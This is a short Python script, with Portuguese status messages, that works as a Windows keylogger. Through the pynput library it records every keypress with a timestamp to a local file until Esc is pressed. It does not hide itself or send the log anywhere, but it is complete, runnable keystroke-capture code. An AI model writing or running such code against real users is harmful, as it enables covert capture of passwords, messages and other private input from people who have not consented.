from pynput import keyboard
import logging
import os

log_file = "keylog_windows.txt"

logging.basicConfig(
    filename=log_file, 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

print(f"[*] Windows Keylogger iniciado...")
print(f"[*] Log: {os.getcwd()}\\{log_file}")

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[*] Encerrado.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()